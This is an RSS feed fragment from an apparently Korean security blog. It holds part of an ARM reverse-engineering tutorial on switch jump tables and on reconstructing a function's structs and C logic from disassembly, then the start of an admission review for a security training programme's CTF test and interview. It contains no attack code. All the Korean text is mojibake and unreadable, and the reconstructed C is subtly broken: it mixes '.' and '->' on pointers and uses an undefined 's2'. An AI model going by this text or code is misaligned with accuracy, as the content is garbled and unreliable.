ë²”ìœ„ ì•ˆì— ìˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="keyword">LDRLS</span> <span class="built_in">PC</span> [<span class="built_in">PC</span>,<span class="built_in">R1</span>,LSL<span class="number">#2</span>]      <span class="comment">; ë²”ìœ„ ì•ˆì— ìˆìœ¼ë©´ ì í”„ í…Œì´ë¸”ì„ ì½ê³  PCì— ëŒ€ì…í•˜ì—¬ ë¶„ê¸°í•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="keyword">B</span> loc_DD10                  <span class="comment">; ë²”ìœ„ ì•ˆì— ì—†ìœ¼ë©´ breakí•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="symbol">DCD</span> loc_DD3C                <span class="comment">; ì í”„ í…Œì´ë¸”ì…ë‹ˆë‹¤.</span></span><br><span class="line"><span class="symbol">DCD</span> loc_DD4C</span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">DCD</span> loc_DCEC                <span class="comment">; ì¸ë±ìŠ¤ 8 (case 8ì— í•´ë‹¹)</span></span><br><span class="line"><span class="symbol">DCD</span> loc_DCEC                <span class="comment">; ì¸ë±ìŠ¤ 9 (case 9ì— í•´ë‹¹)</span></span><br><span class="line"><span class="symbol">DCD</span> loc_DD3C</span><br><span class="line"><span class="symbol">DCD</span> loc_DD3C</span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_DCEC:</span>                   <span class="comment">; case 8, 9ì— í•´ë‹¹í•˜ëŠ” ì½”ë“œ ë¸”ë¡ì…ë‹ˆë‹¤.</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R0</span>, <span class="number">#0</span></span><br><span class="line"><span class="keyword">SUB</span> <span class="built_in">R1</span>, <span class="built_in">R1</span>, <span class="number">#8</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R3</span>, <span class="number">#4</span></span><br><span class="line"><span class="keyword">STR</span> <span class="built_in">R0</span>, [<span class="built_in">R2</span>,<span class="number">#0x14</span>]</span><br><span class="line"><span class="keyword">STRH</span> <span class="built_in">R3</span>, [<span class="built_in">R2</span>,<span class="number">#0x1c</span>]</span><br><span class="line"><span class="keyword">STR</span> <span class="built_in">R1</span>, [<span class="built_in">R2</span>,<span class="number">#0x10</span>]</span><br></pre></td></tr></table></figure><p>Thumb ìƒíƒœì—ì„œëŠ” ì í”„ í…Œì´ë¸”ì— case ë¸”ë¡ì˜ ì£¼ì†Œê°€ ì•„ë‹Œ ì˜¤í”„ì…‹ì„ ë³´ê´€í•©ë‹ˆë‹¤. ê°„ì ‘ ë¶„ê¸°ëŠ” íŠ¹ìˆ˜í•œ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ <code>TBB</code> ì™€ <code>TBH</code> ë¥¼ ì‚¬ìš©í•˜ëŠ”ë°, ì í”„ í…Œì´ë¸”ì˜ ê°’ì— 2ë¥¼ ê³±í•˜ê³  <code>PC</code> ì— ë”í•˜ì—¬ case ë¸”ë¡ì˜ ì£¼ì†Œë¥¼ ì–»ìŠµë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CMP</span> <span class="built_in">R1</span>, <span class="number">#0xb</span>                <span class="comment">; R1ì´ caseì¸ë°, ì í”„ í…Œì´ë¸”ì˜ ë²”ìœ„ ì•ˆì— ìˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="keyword">BHI</span> loc_101E6F2             <span class="comment">; ë²”ìœ„ ì•ˆì— ì—†ìœ¼ë©´ breakí•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="keyword">MOVS</span> <span class="built_in">R6</span>, <span class="number">#4</span></span><br><span class="line"><span class="symbol">TBB.W</span> [<span class="built_in">PC</span>,<span class="built_in">R1</span>]               <span class="comment">; ì í”„ í…Œì´ë¸”ì„ ì½ê³  ë¶„ê¸°í•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="symbol">DCB</span> <span class="number">6</span>                       <span class="comment">; ì í”„ í…Œì´ë¸”ì…ë‹ˆë‹¤.</span></span><br><span class="line"><span class="symbol">DCB</span> <span class="number">0xf</span></span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">DCB</span> <span class="number">0x6d</span>                    <span class="comment">; ì¸ë±ìŠ¤ 8 (case 8ì— í•´ë‹¹)</span></span><br><span class="line"><span class="symbol">DCB</span> <span class="number">0x6d</span>                    <span class="comment">; ì¸ë±ìŠ¤ 9 (case 9ì— í•´ë‹¹)</span></span><br><span class="line"><span class="symbol">DCB</span> <span class="number">6</span></span><br><span class="line"><span class="symbol">DCB</span> <span class="number">6</span></span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">loc_101E6E4:</span>                <span class="comment">; case 8, 9ì— í•´ë‹¹í•˜ëŠ” ì½”ë“œ ë¸”ë¡ì…ë‹ˆë‹¤.</span></span><br><span class="line"><span class="symbol">SUBS.W</span> <span class="built_in">R3</span>, <span class="built_in">R1</span>, <span class="number">#8</span></span><br><span class="line"><span class="keyword">MOVS</span> <span class="built_in">R0</span>, <span class="number">#0</span></span><br><span class="line"><span class="keyword">STR</span> <span class="built_in">R0</span>, [<span class="built_in">R4</span>,<span class="number">#0x14</span>]</span><br></pre></td></tr></table></figure><h2 id="%EB%A6%AC%EB%B2%84%EC%8A%A4-%EC%97%94%EC%A7%80%EB%8B%88%EC%96%B4%EB%A7%81-%EC%97%B0%EC%8A%B5" tabindex="-1">ë¦¬ë²„ìŠ¤ ì—”ì§€ë‹ˆì–´ë§ ì—°ìŠµ</h2><p>ì§€ê¸ˆê¹Œì§€ ì‚´í´ë³¸ ë‚´ìš©ì„ ë°”íƒ•ìœ¼ë¡œ, ì˜ˆì œ í•¨ìˆ˜ë¥¼ ì§ì ‘ ë¦¬ë²„ìŠ¤ ì—”ì§€ë‹ˆì–´ë§í•´ë³´ë©´ì„œ ì—°ìŠµí•´ ë³´ê² ìŠµë‹ˆë‹¤. í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ìœ¼ë©°, í•¨ìˆ˜ì˜ ì½”ë“œëŠ” ê·¸ë˜í”„ë¡œ ë‚˜íƒ€ë‚´ì—ˆìŠµë‹ˆë‹¤.</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDR</span> <span class="built_in">R3</span>, [<span class="built_in">SP</span>,<span class="number">#0x5c</span>]</span><br><span class="line"><span class="keyword">LDR</span> <span class="built_in">R2</span>, [<span class="built_in">SP</span>,<span class="number">#0x58</span>]</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R1</span>, <span class="built_in">R10</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R0</span>, <span class="built_in">R4</span></span><br><span class="line"><span class="keyword">BL</span> unk_function</span><br></pre></td></tr></table></figure><p><img src="/images/arm-1-introduction/6.png" alt="6.png"></p><p>ë‹¤ìŒì€ í•¨ìˆ˜ì˜ ì½”ë“œë¥¼ ë³´ê³  ë¹ ë¥´ê²Œ í™•ì¸í•  ìˆ˜ ìˆëŠ” ì‚¬ì‹¤ë“¤ì…ë‹ˆë‹¤.</p><ul><li>í•¨ìˆ˜ëŠ” ìµœëŒ€ 4ê°œì˜ ì¸ìë¥¼ ë°›ê³ , ë¶ˆë¦¬ì–¸í˜•ì„ ë¦¬í„´í•©ë‹ˆë‹¤.<ul><li>í•¨ìˆ˜ í˜¸ì¶œ ì½”ë“œì—ì„œ <code>R0</code> , <code>R1</code> , <code>R2</code> , <code>R3</code> ì— ê°’ì„ ëŒ€ì…í•˜ê³ , í•¨ìˆ˜ì˜ ë¦¬í„´ ì§ì „ <code>R0</code> ì— ëŒ€ì…ë˜ëŠ” ê°’ì€ 0 ì•„ë‹ˆë©´ 1ì´ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤</li></ul></li><li>ì²«ë²ˆì§¸, ë‘ë²ˆì§¸ ì¸ìëŠ” êµ¬ì¡°ì²´ì˜ í¬ì¸í„°ë¼ê³  ì¶”ì¸¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.<ul><li>3í–‰, 4í–‰ ë“±ì—ì„œ <code>R0</code> ê³¼ <code>R1</code> ì´ <code>LDR</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ë² ì´ìŠ¤ ì£¼ì†Œë¡œ ì‚¬ìš©ë˜ë©°, ìƒìˆ˜ ì˜¤í”„ì…‹ì— ì ‘ê·¼í•˜ê³  ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.</li></ul></li><li>ì„¸ë²ˆì§¸, ë„¤ë²ˆì§¸ ì¸ìì˜ ìë£Œí˜•ì€ ì •ìˆ˜ì…ë‹ˆë‹¤.<ul><li>14í–‰, 15í–‰ì—ì„œ <code>AND</code> , <code>ORR</code> ì—°ì‚°ì˜ ì¸ìë¡œ ì‚¬ìš©ë˜ê³  ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.</li></ul></li></ul><p>ì´ë¥¼ ë°”íƒ•ìœ¼ë¡œ í•¨ìˆ˜ì˜ í”„ë¡œí† íƒ€ì…ì„ ì¶”ì¸¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">unk_function</span><span class="params">(struct1 *, struct2 *, <span class="type">int</span>, <span class="type">int</span>)</span></span><br></pre></td></tr></table></figure><p>ë‹¤ìŒìœ¼ë¡œëŠ” ì‹ë³„ëœ êµ¬ì¡°ì²´ë“¤ì˜ í˜•íƒœë¥¼ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤.</p><ul><li>3~6í–‰ì—ì„œ <code>struct1</code> ì˜ <code>[R0, #8]</code> ê³¼ <code>struct2</code> ì˜ <code>[R1, #0x18]</code> ì„ ë¹„êµí•˜ê³  ìˆìŠµë‹ˆë‹¤.<ul><li>ë‘ í•„ë“œëŠ” ë™ì¼í•œ íƒ€ì…ì´ê³ , ì •ìˆ˜í˜•ì„ì„ ì¶”ì¸¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li></ul></li><li>8í–‰ì—ì„œ <code>struct1</code> ì˜ <code>[R0, #0x10]</code> ì„ ì½ê³  2ì™€ ë¹„êµí•˜ëŠ”ë°, <code>LDRH</code> (load half word) ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ì‚¬ìš©í•˜ê³  ìˆì–´ <code>short</code> íƒ€ì…ì„ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li><li>11~14í–‰ì—ì„œ <code>struct1</code> ì˜ <code>[R0, #0x18]</code> . <code>[R0, #0x1c]</code> ì„ ì½ê³  ê°ê° ì„¸ë²ˆì§¸, ë„¤ë²ˆì§¸ ì¸ìì™€ <code>AND</code> ì—°ì‚°ì„ í•˜ê³  ìˆì–´ í•„ë“œì˜ íƒ€ì…ì´ ì •ìˆ˜í˜•ì„ì„ ì¶”ì¸¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">struct1</span> &#123;</span></span><br><span class="line">    unk8;          <span class="comment">// +0x8 ; struct2.unk18ê³¼ ê°™ì€ íƒ€ì…</span></span><br><span class="line">    <span class="type">short</span> unk10;    <span class="comment">// +0x10</span></span><br><span class="line">    <span class="type">int</span> unk18;      <span class="comment">// +0x18</span></span><br><span class="line">    <span class="type">int</span> unk1c;      <span class="comment">// +0x1c</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">struct2</span> &#123;</span></span><br><span class="line">    unk18;          <span class="comment">// +0x18 ; struct1.unk8ê³¼ ê°™ì€ íƒ€ì…</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>16í–‰ê¹Œì§€ ë¶„ì„í•œ ë‚´ìš©ì„ C ì½”ë“œë¡œ ë‚˜íƒ€ë‚´ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">unk_function</span><span class="params">(struct1 *a1, struct2 *a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (a1.unk8 != s2.unk18</span><br><span class="line">        || a1.unk10 != <span class="number">2</span></span><br><span class="line">        || ((a1.unk18 &amp; a3) | (a1.unk1c &amp; a4)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì´í›„ì˜ ì½”ë“œë¥¼ ê³„ì† ë¶„ì„í•´ ë³´ê² ìŠµë‹ˆë‹¤.</p><ul><li>17í–‰ì€ <code>struct1</code> ì˜ <code>[R0, #0xc]</code> ë¥¼ <code>R3</code> ì— ëŒ€ì…í•˜ê³ , 18í–‰ì€ <code>[R0]</code> ì„ <code>R0</code> ì— ëŒ€ì…í•©ë‹ˆë‹¤.</li><li>19í–‰ì€ <code>R3 + (R3 &lt;&lt; 1)</code> ì„ <code>R2</code> ì— ëŒ€ì…í•˜ëŠ”ë°, ì´ëŠ” ê³§ <code>R3 * 3</code> ì…ë‹ˆë‹¤.</li><li>20í–‰ì€ <code>struct2</code> ì˜  <code>[R1, #0xc]</code> ë¥¼ <code>R3</code> ì— ëŒ€ì…í•˜ê³ , 21í–‰ì€ ë‹¤ì‹œ <code>[R3, #0xc]</code> ë¥¼ <code>R3</code> ì— ëŒ€ì…í•©ë‹ˆë‹¤.<ul><li><code>struct2</code> ì˜ ì˜¤í”„ì…‹ <code>0xc</code> ì— ìœ„ì¹˜í•œ í•„ë“œëŠ” ë‹¤ë¥¸ êµ¬ì¡°ì²´ë¡œì˜ í¬ì¸í„°ì„ì„ ì¶”ì¸¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li></ul></li><li>22í–‰ì€ <code>R3 + R2 * 8</code> ì„ <code>R3</code> ì— ëŒ€ì…í•©ë‹ˆë‹¤.</li><li>23í–‰ì€ <code>[R3, #0x16]</code> ì˜ ë°”ì´íŠ¸ ê°’ì„ <code>LDRSB</code> ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ì‚¬ìš©í•´ <code>R4</code> ì— ëŒ€ì…í•©ë‹ˆë‹¤.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">struct1</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> unk0;       <span class="comment">// +0x0</span></span><br><span class="line">    unk8;           <span class="comment">// +0x8 ; struct2.unk18ê³¼ ê°™ì€ íƒ€ì…</span></span><br><span class="line">    <span class="type">int</span> unkc;       <span class="comment">// +0xc</span></span><br><span class="line">    <span class="type">short</span> unk10;    <span class="comment">// +0x10</span></span><br><span class="line">    <span class="type">int</span> unk18;      <span class="comment">// +0x18</span></span><br><span class="line">    <span class="type">int</span> unk1c;      <span class="comment">// +0x1c</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">struct2</span> &#123;</span></span><br><span class="line">    struct3 *unkc;  <span class="comment">// +0xc</span></span><br><span class="line">    unk18;          <span class="comment">// +0x18 ; struct1.unk8ê³¼ ê°™ì€ íƒ€ì…</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">struct3</span> &#123;</span></span><br><span class="line">    struct4 *unkc;  <span class="comment">// +0xc;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">struct4</span> &#123;</span>    <span class="comment">// í¬ê¸° 24ë°”ì´íŠ¸</span></span><br><span class="line">    <span class="type">char</span> unk16;     <span class="comment">// +0x16</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>22í–‰, 23í–‰ì—ì„œ ë ˆì§€ìŠ¤í„° ê°’ì˜ ì •ìˆ˜ë°°ë¥¼ ì˜¤í”„ì…‹ìœ¼ë¡œ ì‚¬ìš©í•˜ê³  ìˆì–´, ë°°ì—´ì— ì ‘ê·¼í•˜ê³  ìˆìŒì„ ì¶”ì¸¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li><li>ë°°ì—´ì˜ ë² ì´ìŠ¤ ì£¼ì†ŒëŠ” 20í–‰ì˜ <code>[R1, #0xc]</code> ì´ê³ , ì˜¤í”„ì…‹ìœ¼ë¡œ <code>R3 * 3 * 8</code> ì„ ì—°ì‚°í•¨ì—ì„œ í¬ê¸°ê°€ 24ë°”ì´íŠ¸ì¸ <code>struct4</code> êµ¬ì¡°ì²´ë“¤ì˜ ë°°ì—´ì„ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.<ul><li>ì˜¤í”„ì…‹ ê³„ì‚°ì— ì‚¬ìš©ëœ <code>R3</code> ì€ ì¸ë±ìŠ¤ë¡œ, 17í–‰ì—ì„œ <code>[R0, #0xc]</code> ë¥¼ ëŒ€ì…í•œ ê°’ì…ë‹ˆë‹¤.</li></ul></li><li>18í–‰, 24í–‰ì—ì„œ <code>[R0]</code> ì„ ì¸ìë¡œ <code>foo</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. (<code>foo</code> ì˜ ì¸ìëŠ” 1ê°œë¼ê³  ê°€ì •í•©ë‹ˆë‹¤)</li></ul><p>ë‚˜ë¨¸ì§€ ì½”ë“œëŠ” <code>foo</code> ì˜ ë¦¬í„´ê°’ê³¼ 23í–‰ì—ì„œ ëŒ€ì…í•œ <code>R4</code> ì— ëŒ€í•œ ë‹¨ìˆœ ë¶„ê¸°ë¬¸ë“¤ë¡œ, ë¶„ì„í•œ ë‚´ìš©ì„ C ì½”ë“œì— ì¶”ê°€í•˜ë©´ ëŒ€ê°•ì˜ ë¡œì§ê³¼ êµ¬ì¡°ì²´ ì‚¬ì´ì˜ ì°¸ì¡° ê´€ê³„ë¥¼ íŒŒì•…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">unk_function</span><span class="params">(struct1 *a1, struct2 *a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span> &#123;</span><br><span class="line">    <span class="type">char</span> v5;</span><br><span class="line">    <span class="type">int</span> v6;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (a1.unk8 != s2.unk18</span><br><span class="line">        || a1.unk10 != <span class="number">2</span></span><br><span class="line">        || ((a1.unk18 &amp; a3) | (a1.unk1c &amp; a4)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    v5 = a2-&gt;unkc-&gt;unkc[a1-&gt;unkc].unk16;</span><br><span class="line">    v6 = foo(a1-&gt;unk0);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (v6 == <span class="number">0x61</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (v5 != <span class="number">0x61</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (v6 != <span class="number">0x62</span> &amp;&amp; v5 &lt; <span class="number">0x63</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="%EC%B0%B8%EA%B3%A0%EC%9E%90%EB%A3%8C" tabindex="-1">ì°¸ê³ ìë£Œ</h2><p>[1] B. Dang, A. Gazet and E. Bachaalany, â€œARM,â€ in <em>Practical Reverse Engineering</em>. Indianapolis, IN: Wiley, 2014, pp. 39-77.</p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content:encoded>
      
      
      <category domain="https://juhyun167.github.io/categories/Security/">Security</category>
      
      <category domain="https://juhyun167.github.io/categories/Security/ARM-Exploitation/">ARM Exploitation</category>
      
      
      
      <comments>https://juhyun167.github.io/2022/07/02/arm-1-introduction/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>KITRI BoB 9ê¸° ìµœì¢…í•©ê²© / ì„œë¥˜, ë©´ì ‘ í›„ê¸° (2)</title>
      <link>https://juhyun167.github.io/2022/06/18/kitri-bob-9-2/</link>
      <guid>https://juhyun167.github.io/2022/06/18/kitri-bob-9-2/</guid>
      <pubDate>Sat, 18 Jun 2022 10:22:47 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;a href=&quot;/2022/06/09/kitri-bob-9-1/&quot;&gt;ì´ì „ ê¸€&lt;/a&gt;ì—ì„œ ì´ì–´ì§€ëŠ” KITRI BoB í•©ê²© í›„ê¸°ì…ë‹ˆë‹¤.&lt;br&gt;
ì´ë²ˆ ê¸€ì—ì„œëŠ” ì œê°€ ì§€ì›í•œ ì·¨ì•½ì ë¶„ì„ íŠ¸ë™ì˜ í•„ê¸°, ë©´ì ‘ ì „í˜• ê²½í—˜ì„ ê³µìœ í•´ë³´ë ¤ê³  í•©ë‹ˆë‹¤.&lt;/p&gt;
&lt;p&gt;&lt;i</description>
        
      
      
      
      <content:encoded><![CDATA[<p><a href="/2022/06/09/kitri-bob-9-1/">ì´ì „ ê¸€</a>ì—ì„œ ì´ì–´ì§€ëŠ” KITRI BoB í•©ê²© í›„ê¸°ì…ë‹ˆë‹¤.<br>ì´ë²ˆ ê¸€ì—ì„œëŠ” ì œê°€ ì§€ì›í•œ ì·¨ì•½ì ë¶„ì„ íŠ¸ë™ì˜ í•„ê¸°, ë©´ì ‘ ì „í˜• ê²½í—˜ì„ ê³µìœ í•´ë³´ë ¤ê³  í•©ë‹ˆë‹¤.</p><p><img src="/images/kitri-bob-9-2/1.png" alt="1.png"></p><h2 id="%ED%95%84%EA%B8%B0-%EC%A0%84%ED%98%95" tabindex="-1">í•„ê¸° ì „í˜•</h2><ul><li>ì˜¬í•´ ì²˜ìŒ ë„ì…ëœ CTFí˜• í•„ê¸° ì „í˜•ì…ë‹ˆë‹¤.</li><li>ê¸°ì¡´ í•„ê¸° ì „í˜•ê³¼ ìœ ì‚¬í•œ ê°ê´€ì‹ ëª‡ ë¬¸ì œë¥¼ ì œì™¸í•˜ë©´, ì‹¤ì œ íŒŒì¼ì„ ì£¼ê³  í”Œë˜ê·¸ë¥¼ ì°¾ì•„ write-upê³¼ í•¨ê»˜ ì—…ë¡œë“œí•´ì•¼ í•©ë‹ˆë‹¤.<ul><li>ì‹œìŠ¤í…œ í•´í‚¹, ì›¹ í•´í‚¹, ë¦¬ë²„ì‹±, ì•”í˜¸í•™ê³¼ ì•Œê³ ë¦¬ì¦˜ ë¬¸ì œê¹Œì§€ ì¶œì œë˜ì—ˆìŠµë‹ˆë‹¤.</li></ul></li><li>ì†”ì§íˆ ë§í•´ì„œ ì œì¼ ì‰¬ìš´ í•œ ë¬¸ì œ ë¹¼ê³ ëŠ” ì „ë¶€ ì‹œê°„ ë‚´ì— í’€ì§€ ëª»í–ˆìŠµë‹ˆë‹¤.</li><li>ë‹¤ìŒë‚  ë©˜íƒˆì„ ì¡ê³  ë‚˜ë¨¸ì§€ ë¬¸ì œë¥¼ ë³µê¸°í•œ ê²°ê³¼ ì´ëŸ° ê²°ë¡ ì„ ì–»ì—ˆìŠµë‹ˆë‹¤.<ul><li>ìƒê°ë³´ë‹¤ ë¬¸ì œëŠ” ì–´ë µì§€ ì•Šì•˜ìŠµë‹ˆë‹¤.</li><li>ê·¸ëŸ°ë° ë¶ˆì¹œì ˆí•œ ë¬¸ì œëŠ” ê½¤ ë§ìŠµë‹ˆë‹¤. (e.g. ì •ì  ì»´íŒŒì¼ëœ ë°”ì´ë„ˆë¦¬)</li></ul></li><li>CTF ê²½í—˜ì´ ë§ì§€ ì•Šì€ ì´ˆì‹¬ì ë¶„ë“¤ì€ ë¶„ì„í•´ ë³¼ ë§Œí•œ ë¬¸ì œë¥¼ í•˜ë‚˜ ì¡ê³  ëê¹Œì§€ íŒŒê³ ë“œëŠ” ì „ëµì´ ìœ íš¨í•  ê²ƒ ê°™ìŠµë‹ˆë‹¤.<ul><li>ì‹œê°„ì´ ê½¤ ì´‰ë°•í•˜ë‹ˆ, ëª‡ ì‹œê°„ì”© ê±¸ë¦´ ê²ƒ ê°™ì€ ë¬¸ì œëŠ” ê³¼ê°íˆ í¬ê¸°í•˜ëŠ” í¸ì´ ë‚˜ì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.</li></ul></li><li>ê·¸ë¦¬ê³  í•„ê¸° ì „í˜• í›„ì—ë„ í’€ì§€ ëª»í•œ ë¬¸ì œë¥¼ ê¼­ ë‹¤ì‹œ ì‚´í´ë´ì•¼ ë©´ì ‘ ì „í˜•ì—ì„œë„ ë„ì›€ì´ ë  ê°€ëŠ¥ì„±ì´ ë†’ìŠµë‹ˆë‹¤.<ul><li>ì¼ë¶€ ë©˜í† ë‹˜ì€ ê³ ë‚œë„ ë¬¸ì œì˜ í’€ì´ ë°©ë²•ì„ ë¬¼ì–´ë³´ëŠ” ê²½ìš°ê°€ ìˆìŠµë‹ˆë‹¤.<br><br></li></ul></li></ul><p><img src="/images/kitri-bob-9-2/2.png" alt="2.png"></p><h2 id="%EB%A9%B4%EC%A0%91-%EC%A0%84%ED%98%95" tabindex="-1">ë©´ì ‘ ì „í˜•</h2><ul><li>ë©´ì ‘ë„ ë°”ë€Œì–´, ê¸°ì¡´ì˜ í•™ìŠµ ê³„íšì´ë‚˜ í•˜ê³  ì‹¶ì€ í”„ë¡œì íŠ¸ ë°œí‘œëŠ” ì§„í–‰í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.</li><li>3ë¶„ ìê¸°ì†Œê°œê°€ ì¶”ê°€ë˜ì—ˆê³ , ì·¨ì•½ì ë¶„ì„ íŠ¸ë™ì€ ë°œí‘œìë£Œ ì—†ì´ êµ¬ë‘ë¡œ ì§„í–‰í•©ë‹ˆë‹¤.<ul><li>3ë¶„ ìê¸°ì†Œê°œë¥¼ ì¤€ë¹„í•˜ë©´ì„œ ìœ íŠœë¸Œ ì¸ì‹¸ë‹´ë‹¹ì ë‹˜ì˜ <a href="https://www.youtube.com/watch?v=DSBJXuDyDOY&amp;t=55s">ì˜ìƒ</a>ì´ ë§ì€ ë„ì›€ì´ ë˜ì—ˆìŠµë‹ˆë‹¤.</li><li>ê¸°ìˆ  ë©´ì ‘ì— ê°€ê¹Œìš´ ì„±ê²©ì„ ê³ ë ¤í•  ë•Œ, ìˆ˜ì‚¬ë²•ìœ¼ë¡œ ì—´ì •ì„ ê°•ì¡°í•˜ëŠ” ëŒ€ì‹  ë‚˜ëŠ” ì´ëŸ° ì‚¬ëŒì´ê³ , ì´ëŸ° ê²½í—˜ì„ í–ˆê³ , ì´ëŸ° ê±¸ ëŠë¼ê³  ë°°ì› ìœ¼ë©°, ì•ìœ¼ë¡œ ì´ëŸ° ì¼ì„ í•˜ê³  